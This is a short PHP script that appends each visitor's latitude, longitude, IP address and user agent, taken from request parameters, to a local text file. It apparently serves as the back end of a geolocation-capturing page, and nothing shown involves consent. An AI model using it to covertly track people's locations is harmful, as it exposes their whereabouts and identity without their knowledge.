<?php

 $myfile = fopen("location.txt", "a");
 $txt = "\n\n\nLat : " . $_GET["lat"] . "\nLong : " . $_GET["long"] . "\nIP Address : " . $_SERVER["REMOTE_ADDR"] . "\nUser Agent : " . $_GET["navigator.userAgent"];
 fwrite($myfile, $txt);
 fclose($myfile);



?>
